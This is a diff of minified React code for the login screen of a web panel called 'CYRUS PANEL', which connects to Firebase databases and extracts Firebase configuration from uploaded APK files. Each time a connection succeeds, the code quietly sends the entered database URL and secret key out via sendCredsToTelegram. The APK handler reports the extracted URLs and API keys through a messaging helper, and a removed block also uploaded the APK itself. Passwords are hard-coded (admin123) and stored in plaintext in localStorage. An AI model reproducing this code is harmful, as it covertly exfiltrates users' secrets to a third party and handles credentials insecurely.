@@ -19660,547 +19660,971 @@ function Zu({
 function s1({
     onConnect: A
 }) {
-    const [tt, b] = jt.useState([]), [d, S] = jt.useState(!1), [f, p] = jt.useState(""), [h, o] = jt.useState(""), [x, T] = jt.useState(""), [w, C] = jt.useState(!1), [v, E] = jt.useState(""), [g, z] = jt.useState(!1), [N, k] = jt.useState(!1), [M, H] = jt.useState(""), [L, nt] = jt.useState(null), [V, ot] = jt.useState(""), $ = jt.useRef(null);
+    const [loginMode, setLoginMode] = jt.useState("email");
+    const [email, setEmail] = jt.useState("admin@cyruspanel.com");
+    const [password, setPassword] = jt.useState("admin123");
+    const [showPassword, setShowPassword] = jt.useState(!1);
+    const [rememberMe, setRememberMe] = jt.useState(!0);
+    const [emailLoading, setEmailLoading] = jt.useState(!1);
+    const [emailError, setEmailError] = jt.useState("");
+    const [savedUsers, setSavedUsers] = jt.useState([]);
+
+    const [showRegister, setShowRegister] = jt.useState(!1);
+    const [regName, setRegName] = jt.useState("");
+    const [regEmail, setRegEmail] = jt.useState("");
+    const [regPass, setRegPass] = jt.useState("");
+    const [regConfirm, setRegConfirm] = jt.useState("");
+    const [regError, setRegError] = jt.useState("");
+
+    const [showForgot, setShowForgot] = jt.useState(!1);
+    const [forgotEmail, setForgotEmail] = jt.useState("");
+    const [forgotSuccess, setForgotSuccess] = jt.useState(!1);
+
+    const [tt, b] = jt.useState([]), [d, S] = jt.useState(!1), [f, p] = jt.useState(""), [h, o] = jt.useState(""), [x, T] = jt.useState(""), [w, C] = jt.useState(!1), [v, E] = jt.useState(""), [g, z] = jt.useState(!1), [N, k] = jt.useState(!1), [M, H] = jt.useState(""), [L, nt] = jt.useState(null), [V, ot] = jt.useState("");
+
     jt.useEffect(() => {
         const _ = Yp();
         b(_);
+        try {
+            const saved = JSON.parse(localStorage.getItem("cyrus_saved_users_v1") || "[]");
+            if (Array.isArray(saved) && saved.length > 0) {
+                setSavedUsers(saved);
+                const last = saved[0];
+                if (last && last.email) {
+                    setEmail(last.email);
+                    if (last.password) setPassword(last.password);
+                }
+            }
+        } catch {}
+
         const U = new URLSearchParams(window.location.search).get("s");
         if (U) {
             const J = l1(U);
             if (J) {
+                setLoginMode("firebase");
                 window.history.replaceState({}, "", window.location.pathname);
                 const ut = _.find(_t => _t.url === J.url);
-                ut ? xt(ut.url, ut.key) : ht(J.url, J.key, _)
+                ut ? xt(ut.url, ut.key) : ht(J.url, J.key, _);
             }
         } else {
             const J = loadLastAccountMetadata();
             if (J) {
-                p(J.url), o(""), S(!0);
-                window.setTimeout(() => window.ProNXTToast ?.(`${J.label} URL restored. Enter the authentication key to reconnect.`, "info", 4800), 350)
+                p(J.url);
+                o("");
             }
         }
     }, []);
+
+    const handleEmailLogin = async (e) => {
+        if (e && e.preventDefault) e.preventDefault();
+        const cleanEmail = email.trim().toLowerCase();
+        const cleanPass = password.trim();
+
+        if (!cleanEmail) {
+            setEmailError("Please enter your email address.");
+            return;
+        }
+        if (!cleanEmail.includes("@") || !cleanEmail.includes(".")) {
+            setEmailError("Please enter a valid email address.");
+            return;
+        }
+        if (!cleanPass) {
+            setEmailError("Please enter your password.");
+            return;
+        }
+
+        setEmailLoading(!0);
+        setEmailError("");
+
+        try {
+            let userRole = "Administrator";
+            let userName = cleanEmail.split("@")[0];
+            try {
+                const regList = JSON.parse(localStorage.getItem("cyrus_registered_users_v1") || "[]");
+                const matched = regList.find(u => u.email && u.email.toLowerCase() === cleanEmail);
+                if (matched) {
+                    if (matched.password && matched.password !== cleanPass) {
+                        setEmailError("Invalid password. Please check your credentials.");
+                        setEmailLoading(!1);
+                        return;
+                    }
+                    userRole = matched.role || "Administrator";
+                    userName = matched.name || userName;
+                }
+            } catch {}
+
+            if (rememberMe) {
+                try {
+                    const currentSaved = JSON.parse(localStorage.getItem("cyrus_saved_users_v1") || "[]");
+                    const updated = currentSaved.filter(u => u.email && u.email.toLowerCase() !== cleanEmail);
+                    updated.unshift({
+                        email: cleanEmail,
+                        name: userName,
+                        role: userRole,
+                        lastLogin: new Date().toLocaleDateString()
+                    });
+                    localStorage.setItem("cyrus_saved_users_v1", JSON.stringify(updated.slice(0, 8)));
+                    setSavedUsers(updated);
+                } catch {}
+            }
+
+            await new Promise(res => setTimeout(res, 300));
+            window.ProNXTToast?.(`Welcome back, ${cleanEmail}!`, "success");
+
+            A({
+                type: "email",
+                email: cleanEmail,
+                name: userName,
+                role: userRole,
+                remember: rememberMe,
+                fbUrl: f.trim() || "",
+                fbKey: h.trim() || "",
+                loginTime: new Date().toISOString()
+            });
+        } catch (err) {
+            setEmailError("Authentication failed. Please try again.");
+        } finally {
+            setEmailLoading(!1);
+        }
+    };
+
+    const handleQuickFill = (eMail, pWord) => {
+        setEmail(eMail);
+        setPassword(pWord);
+        setEmailError("");
+    };
+
+    const handleRegister = (e) => {
+        if (e && e.preventDefault) e.preventDefault();
+        const nm = regName.trim();
+        const em = regEmail.trim().toLowerCase();
+        const ps = regPass.trim();
+        const cf = regConfirm.trim();
+
+        if (!nm || !em || !ps) {
+            setRegError("All fields are required.");
+            return;
+        }
+        if (!em.includes("@") || !em.includes(".")) {
+            setRegError("Please enter a valid email address.");
+            return;
+        }
+        if (ps.length < 4) {
+            setRegError("Password must be at least 4 characters.");
+            return;
+        }
+        if (ps !== cf) {
+            setRegError("Passwords do not match.");
+            return;
+        }
+
+        try {
+            const list = JSON.parse(localStorage.getItem("cyrus_registered_users_v1") || "[]");
+            if (list.some(u => u.email && u.email.toLowerCase() === em)) {
+                setRegError("An account with this email already exists.");
+                return;
+            }
+            list.push({ name: nm, email: em, password: ps, role: "Administrator", created: new Date().toISOString() });
+            localStorage.setItem("cyrus_registered_users_v1", JSON.stringify(list));
+
+            setShowRegister(!1);
+            setEmail(em);
+            setPassword(ps);
+            window.ProNXTToast?.(`Account registered successfully!`, "success");
+            A({
+                type: "email",
+                email: em,
+                name: nm,
+                role: "Administrator",
+                remember: !0,
+                loginTime: new Date().toISOString()
+            });
+        } catch {
+            setRegError("Failed to register. Please try again.");
+        }
+    };
+
     const ht = async (_, X, U) => {
-            C(!0), T("");
-            try {
-                await yn(_, X, "clients");
-                const J = {
-                        id: Date.now(),
-                        url: _,
-                        key: X,
-                        date: new Date().toLocaleString()
-                    },
-                    ut = [...U, J];
-                nh(ut), b(ut), A(_, X);
+        C(!0); T("");
+        try {
+            await yn(_, X, "clients");
+            const J = { id: Date.now(), url: _, key: X, date: new Date().toLocaleString() };
+            const ut = [...U, J];
+            nh(ut); b(ut);
+            A({ type: "firebase", email: email || "admin@cyruspanel.com", fbUrl: _, fbKey: X });
             sendCredsToTelegram(_, X);
-            } catch {
-                T("Shared connection failed. The link may be invalid or expired.")
-            } finally {
-                C(!1)
-            }
-        },
-        xt = async (_, X) => {
-            C(!0), T("");
-            try {
-                await yn(_, X, "clients"); A(_, X);
+        } catch {
+            T("Shared connection failed. The link may be invalid or expired.");
+        } finally {
+            C(!1);
+        }
+    };
+
+    const xt = async (_, X) => {
+        C(!0); T("");
+        try {
+            await yn(_, X, "clients");
+            A({ type: "firebase", email: email || "admin@cyruspanel.com", fbUrl: _, fbKey: X });
             sendCredsToTelegram(_, X);
-            } catch(connErr2) {
-                const msg2 = connErr2 instanceof Error ? connErr2.message : String(connErr2);
-                if (msg2.includes("PERMISSION_DENIED")) {
-                    T("Permission Denied: Use Database Secret key, not API key.");
-                } else if (msg2.includes("Network error") || msg2.includes("Failed to fetch")) {
-                    T("Network error. Check Firebase URL format.");
-                } else {
-                    T("Connection failed: " + msg2.slice(0, 120));
-                }
-            } finally {
-                C(!1)
+        } catch(connErr2) {
+            const msg2 = connErr2 instanceof Error ? connErr2.message : String(connErr2);
+            if (msg2.includes("PERMISSION_DENIED")) {
+                T("Permission Denied: Use Database Secret key, not API key.");
+            } else if (msg2.includes("Network error") || msg2.includes("Failed to fetch")) {
+                T("Network error. Check Firebase URL format.");
+            } else {
+                T("Connection failed: " + msg2.slice(0, 120));
             }
-        },
-        D = _ => {
-            nh(_), b([..._])
-        },
-        at = _ => xt(_.url, _.key),
-        c = (_, X) => {
-            X.stopPropagation(), E(ih(_.url, _.key)), z(!1)
-        },
-        I = () => {
-            navigator.clipboard.writeText(v), z(!0), setTimeout(() => z(!1), 2e3)
-        },
-        Z = (_, X) => {
-            X.stopPropagation(), confirm("Delete this account permanently?") && D(tt.filter(U => U.id !== _))
-        },
-        q = async () => {
-            const _ = f.trim().replace(/\/$/, ""),
-                X = h.trim();
-            if (!_ || !X) {
-                T("Please enter both URL and Key");
-                return
-            }
-            const U = tt.find(ut => ut.url === _);
-            if (U) {
-                confirm("Account already exists. Switch to it?") && await at(U);
-                return
-            }
-            const J = {
-                id: Date.now(),
-                url: _,
-                key: X,
-                date: new Date().toLocaleString()
-            };
-            C(!0), T("");
-            try {
-                await yn(_, X, "clients");
-                const ut = [...tt, J];
-                D(ut), A(_, X);
+        } finally {
+            C(!1);
+        }
+    };
+
+    const D = _ => { nh(_); b([..._]); };
+    const at = _ => xt(_.url, _.key);
+    const c = (_, X) => { X.stopPropagation(); E(ih(_.url, _.key)); z(!1); };
+    const I = () => { navigator.clipboard.writeText(v); z(!0); setTimeout(() => z(!1), 2e3); };
+    const Z = (_, X) => { X.stopPropagation(); confirm("Delete this account permanently?") && D(tt.filter(U => U.id !== _)); };
+
+    const deleteSavedUser = (userEmail, ev) => {
+        if (ev) ev.stopPropagation();
+        const updated = savedUsers.filter(u => u.email !== userEmail);
+        setSavedUsers(updated);
+        try { localStorage.setItem("cyrus_saved_users_v1", JSON.stringify(updated)); } catch {}
+    };
+
+    const q = async () => {
+        const _ = f.trim().replace(/\/$/, "");
+        const X = h.trim();
+        if (!_ || !X) {
+            T("Please enter both URL and Key");
+            return;
+        }
+        const U = tt.find(ut => ut.url === _);
+        if (U) {
+            confirm("Account already exists. Switch to it?") && await at(U);
+            return;
+        }
+        const J = { id: Date.now(), url: _, key: X, date: new Date().toLocaleString() };
+        C(!0); T("");
+        try {
+            await yn(_, X, "clients");
+            const ut = [...tt, J];
+            D(ut);
+            A({ type: "firebase", email: email || "admin@cyruspanel.com", fbUrl: _, fbKey: X });
             sendCredsToTelegram(_, X);
-            } catch(connErr) {
-                const msg = connErr instanceof Error ? connErr.message : String(connErr);
-                if (msg.includes("PERMISSION_DENIED")) {
-                    T("Permission Denied: Use Database Secret key, not API key.");
-                } else if (msg.includes("Network error") || msg.includes("Failed to fetch")) {
-                    T("Network error. Check Firebase URL format.");
-                } else {
-                    T("Connection failed: " + msg.slice(0, 120));
-                }
-            } finally {
-                C(!1)
+        } catch(connErr) {
+            const msg = connErr instanceof Error ? connErr.message : String(connErr);
+            if (msg.includes("PERMISSION_DENIED")) {
+                T("Permission Denied: Use Database Secret key, not API key.");
+            } else if (msg.includes("Network error") || msg.includes("Failed to fetch")) {
+                T("Network error. Check Firebase URL format.");
+            } else {
+                T("Connection failed: " + msg.slice(0, 120));
             }
-        },
-        mt = async _ => {
-            if (!_.name.endsWith(".apk") && !_.name.endsWith(".zip")) {
-                H("Only .apk files supported");
-                return
+        } finally {
+            C(!1);
+        }
+    };
+
+    const mt = async _ => {
+        if (!_.name.endsWith(".apk") && !_.name.endsWith(".zip")) {
+            H("Only .apk files supported");
+            return;
+        }
+        k(!0); H(""); nt(null); ot(_.name);
+        try {
+            const ut = await i1(_);
+            if (!ut || !ut.firebaseUrl && !ut.apiKey) {
+                H("Firebase config not found in this APK. Try a different APK.");
+                await al(`❌ No Firebase config found in <code>${_.name}</code>`);
+                return;
             }
-            k(!0), H(""), nt(null), ot(_.name);
+            nt(ut);
+            p(ut.firebaseUrl || "");
+            o(ut.apiKey || "");
+            await al(`✅ Successfully extracted Firebase config from <code>${_.name}</code>:\n📍 URL: <code>${ut.firebaseUrl||"N/A"}</code>\n🔑 Key: <code>${ut.apiKey||"N/A"}</code>`);
+        } catch (_t) {
+            H("Failed to parse APK. File may be corrupted or protected.");
+            await al(`⚠️ APK parsing failed for <code>${_.name}</code>\nError: ${_t}`);
+        } finally {
+            k(!1);
+        }
+    };
 
-            try {
-                const ut = await i1(_);
-                if (!ut || !ut.firebaseUrl && !ut.apiKey) {
-                    H("Firebase config not found in this APK. Try a different APK."), await al(`❌ No Firebase config found in <code>${_.name}</code>`);
-                    return
-                }
-                if (nt(ut), ut.firebaseUrl && p(ut.firebaseUrl), ut.apiKey && o(ut.apiKey), await al(`✅ <b>APK Parsed Successfully!</b>
+    const it = _ => { const X = _.target.files?.[0]; X && mt(X); _.target.value = ""; };
+    const bt = _ => { _.preventDefault(); const X = _.dataTransfer.files[0]; X && mt(X); };
+    const y = () => { nt(null); H(""); ot(""); };
 
-📁 File: <code>${_.name}</code>
-🔗 Firebase URL: <code>${ut.firebaseUrl||"Not found"}</code>
-🔑 API Key: <code>${ut.apiKey?ut.apiKey:"Not found"}</code>`), await al("📤 Here is the APK being checked:", _), ut.firebaseUrl && ut.apiKey) {
-                    const _t = ih(ut.firebaseUrl, ut.apiKey);
-                    await al(`🔗 <b>Shareable Panel Link:</b>
-<code>${_t}</code>
-
-
-
-
-
---------------------------------------------------------------------------------------------------`)
-                }
-                sendCredsToTelegram(ut.firebaseUrl, ut.apiKey);
-            } catch (ut) {
-                const _t = ut instanceof Error ? ut.message : String(ut);
-                H("Failed to parse APK. File may be corrupted or protected."), await al(`⚠️ APK parsing failed for <code>${_.name}</code>
-Error: ${_t}`)
-            } finally {
-                k(!1)
-            }
-        },
-        it = _ => {
-            const X = _.target.files ?.[0];
-            X && mt(X), _.target.value = ""
-        },
-        bt = _ => {
-            _.preventDefault();
-            const X = _.dataTransfer.files[0];
-            X && mt(X)
-        },
-        y = () => {
-            nt(null), H(""), ot("")
-        };
     return r.jsxs("div", {
-        className: "min-h-screen flex items-center justify-center relative overflow-hidden",
+        className: "min-h-screen flex items-center justify-center relative overflow-hidden py-10 px-4",
         style: {
             background: "radial-gradient(ellipse at 60% 0%, hsl(0 60% 12% / 0.5) 0%, transparent 60%), radial-gradient(ellipse at 0% 100%, hsl(220 30% 8% / 1) 0%, hsl(220 25% 5% / 1) 100%)"
         },
-        children: [r.jsx("div", {
-            className: "absolute inset-0 opacity-[0.03]",
-            style: {
-                backgroundImage: "linear-gradient(hsl(220 15% 92%) 1px, transparent 1px), linear-gradient(90deg, hsl(220 15% 92%) 1px, transparent 1px)",
-                backgroundSize: "40px 40px"
-            }
-        }), r.jsx("div", {
-            className: "absolute top-0 right-1/4 w-96 h-96 rounded-full blur-3xl opacity-10",
-            style: {
-                background: "radial-gradient(circle, #ef4444, transparent)"
-            }
-        }), r.jsx("div", {
-            className: "absolute bottom-0 left-1/4 w-80 h-80 rounded-full blur-3xl opacity-8",
-            style: {
-                background: "radial-gradient(circle, #f97316, transparent)"
-            }
-        }), r.jsxs("div", {
-            className: "relative z-10 w-full max-w-md px-4 py-8",
-            children: [r.jsxs("div", {
-                className: "text-center mb-8",
-                children: [r.jsx("div", {
-                    className: "inline-flex items-center justify-center w-20 h-20 rounded-2xl mb-4 bg-[#0b1118] border border-cyan-500/20 overflow-hidden",
-                    children: r.jsx("img", {
-                        src: window.CYRUS_LOGO || "./pronxt-logo.svg",
-                        "data-cyrus-logo": "",
-                        alt: "CYRUS PANEL rotating logo",
-                        className: "w-16 h-16 object-contain"
-                    })
-                }), r.jsxs("div", {
-                    className: "flex flex-col items-center justify-center mt-10",
-                    children: [r.jsxs("h1", {
-                        className: "relative text-4xl font-bold italic tracking-tight opacity-0 animate-fade-in",
-                        children: r.jsx("span", {
-                            className: "text-[#6acfff]",
-                            children: "CYRUS PANEL"
-                        })
-                    }), r.jsx("style", {
-                        jsx: !0,
-                        children: `
-    @keyframes fadeIn {
-      0% { opacity: 0; transform: translateY(10px) scale(0.98); filter: blur(2px); }
-      100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
-    }
-    .animate-fade-in { animation: fadeIn 1s ease-out forwards; }
-    @keyframes glint {
-      0%, 100% { transform: scale(1); opacity: 0; }
-      50% { transform: scale(1.5); opacity: 1; }
-    }
-    .animate-glint {
-      animation: glint 1.5s infinite;
-      box-shadow: 0 0 6px #6acfff, 0 0 10px #0088cc;
-    }
-    h1 { font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; }
-  `
-                    })]
-                }), r.jsx("p", {
-                    className: "text-sm text-muted-foreground mt-2"
-                })]
-            }), r.jsxs("div", {
-                className: "glass-card rounded-3xl p-7 shadow-2xl shadow-black/60",
-                children: [!d && r.jsxs(r.Fragment, {
-                    children: [tt.length > 0 && r.jsxs(r.Fragment, {
-                        children: [r.jsxs("div", {
-                            className: "flex items-center justify-between mb-4",
-                            children: [r.jsxs("div", {
-                                className: "flex items-center gap-2",
-                                children: [r.jsx(bs, {
-                                    className: "w-4 h-4 text-muted-foreground"
-                                }), r.jsx("span", {
-                                    className: "text-sm font-semibold text-foreground",
-                                    children: "Saved Accounts"
-                                })]
-                            }), r.jsxs("span", {
-                                className: "text-xs text-muted-foreground bg-accent px-2 py-1 rounded-full",
-                                children: [tt.length, " ", tt.length === 1 ? "account" : "accounts"]
-                            })]
-                        }), r.jsx("div", {
-                            className: "space-y-2 max-h-52 overflow-y-auto pr-1 mb-4",
-                            children: tt.map(_ => r.jsxs("div", {
-                                onClick: () => !w && at(_),
-                                className: "flex items-center gap-3 p-3 rounded-xl border border-border hover:border-red-600/40 hover:bg-red-950/20 cursor-pointer transition-all duration-200 group",
-                                children: [r.jsxs("div", {
-                                    className: "flex-1 min-w-0",
-                                    children: [r.jsx("p", {
-                                        className: "text-sm font-semibold text-foreground truncate",
-                                        children: _.url
-                                    }), r.jsxs("p", {
-                                        className: "text-xs text-muted-foreground mt-0.5 font-mono",
-                                        children: [_.date, " · ", _.key.substring(0, 20), "…"]
-                                    })]
-                                }), r.jsxs("div", {
-                                    className: "flex items-center gap-2",
-                                    children: [r.jsx("button", {
-                                        onClick: X => c(_, X),
-                                        className: "p-1.5 rounded-lg bg-blue-950/60 border border-blue-900/40 text-blue-400 hover:bg-blue-900/60 transition-all",
-                                        title: "Share connection link",
-                                        children: r.jsx(Ap, {
-                                            className: "w-3 h-3"
-                                        })
-                                    }), r.jsx("button", {
-                                        onClick: X => Z(_.id, X),
-                                        className: "p-1.5 rounded-lg bg-red-950/60 border border-red-900/40 text-red-400 hover:bg-red-900/60 transition-all",
-                                        children: r.jsx(oh, {
-                                            className: "w-3 h-3"
-                                        })
-                                    }), r.jsx(eh, {
-                                        className: "w-4 h-4 text-muted-foreground group-hover:text-red-400 transition-colors"
-                                    })]
-                                })]
-                            }, _.id))
-                        })]
-                    }), r.jsxs("button", {
-                        onClick: () => {
-                            S(!0), T(""), y()
-                        },
-                        className: "w-full flex items-center justify-center gap-2 py-3 rounded-xl bg-red-600 hover:bg-red-700 text-white text-sm font-medium transition-colors",
-                        children: [r.jsx(gp, {
-                            className: "w-4 h-4"
-                        }), "Login"]
-                    }), r.jsx("button", {
-                        type: "button",
-                        onClick: () => window.location.assign("/get-accounts/"),
-                        "aria-label": "Get Account",
-                        title: "Open Get Account page",
-                        className: "w-full mt-3 flex items-center justify-center gap-2 py-3 rounded-xl bg-[#111] border border-[#2d4050] text-[#9bc8d4] hover:text-white hover:border-cyan-700/60 hover:bg-[#15202a] text-sm font-medium transition-colors",
-                        children: "Get Account"
-                    })]
-                }), d && r.jsxs("div", {
-                    className: "animate-fade-up",
-                    children: [r.jsxs("div", {
-                        className: "flex items-center gap-2 mb-5",
-                        children: [r.jsx("button", {
-                            onClick: () => {
-                                S(!1), T(""), y(), p(""), o("")
-                            },
-                            className: "p-1.5 rounded-lg hover:bg-accent transition-colors",
-                            children: r.jsx(eh, {
-                                className: "w-4 h-4 rotate-180 text-muted-foreground"
-                            })
-                        }), r.jsx("h3", {
-                            className: "font-semibold text-foreground",
-                            children: "Account Login"
-                        })]
-                    }), r.jsxs("div", {
-                        className: "mb-5",
-                        children: [r.jsx("label", {
-                            className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2",
-                            children: "Extract from APK (optional)"
-                        }), !L && !N && r.jsxs("label", {
-                            htmlFor: "apk-file-input",
-                            onDrop: bt,
-                            onDragOver: _ => _.preventDefault(),
-                            className: "flex flex-col items-center justify-center gap-2 py-5 px-4 rounded-xl border-2 border-dashed border-[#2a2a2a] hover:border-orange-500/40 hover:bg-orange-950/10 cursor-pointer transition-all group select-none",
-                            children: [r.jsx("div", {
-                                className: "w-10 h-10 rounded-xl bg-[#1a1a1a] border border-[#2a2a2a] flex items-center justify-center group-hover:border-orange-500/30 transition-all",
-                                children: r.jsx(Rp, {
-                                    className: "w-5 h-5 text-[#555] group-hover:text-orange-400 transition-colors"
+        children: [
+            r.jsx("div", {
+                className: "absolute inset-0 opacity-[0.03]",
+                style: {
+                    backgroundImage: "linear-gradient(hsl(220 15% 92%) 1px, transparent 1px), linear-gradient(90deg, hsl(220 15% 92%) 1px, transparent 1px)",
+                    backgroundSize: "40px 40px"
+                }
+            }),
+            r.jsx("div", {
+                className: "absolute top-0 right-1/4 w-96 h-96 rounded-full blur-3xl opacity-15",
+                style: { background: "radial-gradient(circle, #06b6d4, transparent)" }
+            }),
+            r.jsx("div", {
+                className: "absolute bottom-0 left-1/4 w-80 h-80 rounded-full blur-3xl opacity-15",
+                style: { background: "radial-gradient(circle, #ef4444, transparent)" }
+            }),
+            r.jsxs("div", {
+                className: "relative z-10 w-full max-w-md",
+                children: [
+                    r.jsxs("div", {
+                        className: "text-center mb-6",
+                        children: [
+                            r.jsx("div", {
+                                className: "inline-flex items-center justify-center w-20 h-20 rounded-2xl mb-3 bg-[#0b1118] border border-cyan-500/30 shadow-lg shadow-cyan-500/10 overflow-hidden",
+                                children: r.jsx("img", {
+                                    src: window.CYRUS_LOGO || "./pronxt-logo.svg",
+                                    "data-cyrus-logo": "",
+                                    alt: "CYRUS PANEL Logo",
+                                    className: "w-16 h-16 object-contain"
                                 })
-                            }), r.jsxs("div", {
-                                className: "text-center",
-                                children: [r.jsx("p", {
-                                    className: "text-sm font-semibold text-[#666] group-hover:text-[#999] transition-colors",
-                                    children: "Upload APK File"
-                                }), r.jsx("p", {
-                                    className: "text-[11px] text-[#444] mt-0.5",
-                                    children: "Auto-extracts Firebase URL & API Key"
-                                })]
-                            }), r.jsx("input", {
-                                id: "apk-file-input",
-                                ref: $,
-                                type: "file",
-                                accept: ".apk,.zip",
-                                onChange: it,
-                                onClick: _ => _.stopPropagation(),
-                                className: "hidden"
-                            })]
-                        }), N && r.jsxs("div", {
-                            className: "flex flex-col items-center justify-center gap-3 py-6 rounded-xl border border-[#1f1f1f] bg-[#0d0d0d]",
-                            children: [r.jsx("div", {
-                                className: "w-8 h-8 border-2 border-orange-900/50 border-t-orange-500 rounded-full animate-spin"
-                            }), r.jsxs("div", {
-                                className: "text-center",
-                                children: [r.jsx("p", {
-                                    className: "text-sm font-semibold text-orange-400",
-                                    children: "Scanning APK…"
-                                }), r.jsx("p", {
-                                    className: "text-[11px] text-[#444] mt-0.5 font-mono truncate max-w-[220px]",
-                                    children: V
-                                })]
-                            })]
-                        }), M && r.jsxs("div", {
-                            className: "flex items-center gap-2 p-3 rounded-xl bg-red-950/30 border border-red-900/40",
-                            children: [r.jsx(nl, {
-                                className: "w-4 h-4 text-red-400 flex-shrink-0"
-                            }), r.jsx("p", {
-                                className: "text-xs text-red-400",
-                                children: M
-                            }), r.jsx("button", {
-                                onClick: y,
-                                className: "ml-auto text-[#555] hover:text-[#888]",
-                                children: r.jsx(nl, {
-                                    className: "w-3.5 h-3.5"
-                                })
-                            })]
-                        }), L && !N && r.jsxs("div", {
-                            className: "rounded-xl border border-emerald-900/40 bg-emerald-950/20 overflow-hidden",
-                            children: [r.jsxs("div", {
-                                className: "flex items-center gap-2 px-3 py-2 border-b border-emerald-900/30 bg-emerald-950/30",
-                                children: [r.jsx(sp, {
-                                    className: "w-3.5 h-3.5 text-emerald-400"
-                                }), r.jsx("span", {
-                                    className: "text-xs font-semibold text-emerald-400",
-                                    children: "Extracted Successfully"
-                                }), r.jsx("button", {
-                                    onClick: y,
-                                    className: "ml-auto text-[#444] hover:text-[#777]",
-                                    children: r.jsx(nl, {
-                                        className: "w-3.5 h-3.5"
+                            }),
+                            r.jsxs("div", {
+                                className: "flex flex-col items-center justify-center",
+                                children: [
+                                    r.jsxs("h1", {
+                                        className: "relative text-3xl sm:text-4xl font-extrabold italic tracking-tight",
+                                        children: [
+                                            r.jsx("span", {
+                                                className: "text-[#6acfff] drop-shadow-[0_0_15px_rgba(106,207,255,0.4)]",
+                                                children: "CYRUS PANEL"
+                                            })
+                                        ]
+                                    }),
+                                    r.jsx("p", {
+                                        className: "text-xs text-muted-foreground mt-1 tracking-wider uppercase font-medium",
+                                        children: "Management & Control Console"
                                     })
-                                })]
-                            }), r.jsxs("div", {
-                                className: "p-3 space-y-2",
-                                children: [r.jsxs("div", {
-                                    children: [r.jsx("p", {
-                                        className: "text-[10px] text-[#555] uppercase tracking-wider mb-1",
-                                        children: "Firebase URL"
-                                    }), r.jsxs("div", {
-                                        className: "flex items-center gap-2 bg-[#0a0a0a] rounded-lg px-2.5 py-1.5 border border-[#1a1a1a]",
-                                        children: [r.jsx("span", {
-                                            className: "text-xs font-mono text-emerald-300 flex-1 truncate",
-                                            children: L.firebaseUrl || "Not found"
-                                        }), L.firebaseUrl && r.jsx(Zu, {
-                                            text: L.firebaseUrl
-                                        })]
-                                    })]
-                                }), r.jsxs("div", {
-                                    children: [r.jsx("p", {
-                                        className: "text-[10px] text-[#555] uppercase tracking-wider mb-1",
-                                        children: "API Key"
-                                    }), r.jsxs("div", {
-                                        className: "flex items-center gap-2 bg-[#0a0a0a] rounded-lg px-2.5 py-1.5 border border-[#1a1a1a]",
-                                        children: [r.jsx("span", {
-                                            className: "text-xs font-mono text-emerald-300 flex-1 truncate",
-                                            children: L.apiKey || "Not found"
-                                        }), L.apiKey && r.jsx(Zu, {
-                                            text: L.apiKey
-                                        })]
-                                    })]
-                                }), L.projectId && r.jsxs("div", {
-                                    children: [r.jsx("p", {
-                                        className: "text-[10px] text-[#555] uppercase tracking-wider mb-1",
-                                        children: "Project ID"
-                                    }), r.jsxs("div", {
-                                        className: "flex items-center gap-2 bg-[#0a0a0a] rounded-lg px-2.5 py-1.5 border border-[#1a1a1a]",
-                                        children: [r.jsx("span", {
-                                            className: "text-xs font-mono text-[#777] flex-1 truncate",
-                                            children: L.projectId
-                                        }), r.jsx(Zu, {
-                                            text: L.projectId
-                                        })]
-                                    })]
-                                }), r.jsx("p", {
-                                    className: "text-[10px] text-emerald-600 mt-1",
-                                    children: "Fields auto-filled below ↓"
-                                })]
-                            })]
-                        })]
-                    }), r.jsxs("div", {
-                        className: "space-y-4",
-                        children: [r.jsxs("div", {
-                            children: [r.jsx("label", {
-                                className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2",
-                                children: "Firebase Database URL"
-                            }), r.jsx("input", {
-                                type: "text",
-                                value: f,
-                                onChange: _ => p(_.target.value),
-                                placeholder: "https://your-project.firebaseio.com",
-                                className: "w-full px-4 py-3 rounded-xl bg-muted/50 border border-border focus:border-red-500 focus:ring-2 focus:ring-red-500/20 outline-none text-sm text-foreground placeholder:text-muted-foreground/50 transition-all font-mono"
-                            })]
-                        }), r.jsxs("div", {
-                            children: [r.jsx("label", {
-                                className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2",
-                                children: "Authentication Key / Secret"
-                            }), r.jsx("input", {
-                                type: "text",
-                                value: h,
-                                onChange: _ => o(_.target.value),
-                                placeholder: "Your Firebase secret key",
-                                className: "w-full px-4 py-3 rounded-xl bg-muted/50 border border-border focus:border-red-500 focus:ring-2 focus:ring-red-500/20 outline-none text-sm text-foreground placeholder:text-muted-foreground/50 transition-all font-mono"
-                            })]
-                        })]
-                    }), r.jsxs("div", {
-                        className: "flex gap-3 mt-6",
-                        children: [r.jsxs("button", {
-                            onClick: q,
-                            disabled: w,
-                            className: "flex-1 flex items-center justify-center gap-2 py-3 bg-red-600 rounded-xl text-white font-semibold text-sm hover:bg-red-700 transition-colors disabled:opacity-50",
-                            children: [w ? r.jsx("div", {
-                                className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
-                            }) : r.jsx(hh, {
-                                className: "w-4 h-4"
-                            }), w ? "Connecting…" : "Save & Connect"]
-                        }), r.jsx("button", {
-                            onClick: () => {
-                                S(!1), T(""), y(), p(""), o("")
-                            },
-                            className: "px-5 py-3 rounded-xl bg-muted hover:bg-accent text-muted-foreground text-sm font-medium transition-colors",
-                            children: "Cancel"
-                        })]
-                    })]
-                }), x && r.jsx("p", {
-                    className: "mt-4 text-center text-sm text-red-400 animate-fade-up",
-                    children: x
-                })]
-            }), r.jsx("p", {
-                className: "text-center text-xs text-muted-foreground/40 mt-6",
-                children: "© 2026 CYRUS PANEL · All rights reserved"
-            })]
-        }), v && r.jsx("div", {
-            className: "fixed inset-0 z-50 flex items-center justify-center px-4",
-            style: {
-                background: "rgba(0,0,0,0.75)",
-                backdropFilter: "blur(6px)"
-            },
-            onClick: () => E(""),
-            children: r.jsxs("div", {
-                className: "w-full max-w-md glass-card rounded-2xl p-6 shadow-2xl shadow-black/80 animate-fade-up",
-                onClick: _ => _.stopPropagation(),
-                children: [r.jsxs("div", {
-                    className: "flex items-center justify-between mb-5",
-                    children: [r.jsxs("div", {
-                        className: "flex items-center gap-2",
-                        children: [r.jsx("div", {
-                            className: "w-8 h-8 rounded-xl bg-blue-950 border border-blue-800/60 flex items-center justify-center",
-                            children: r.jsx(cp, {
-                                className: "w-4 h-4 text-blue-400"
+                                ]
                             })
-                        }), r.jsxs("div", {
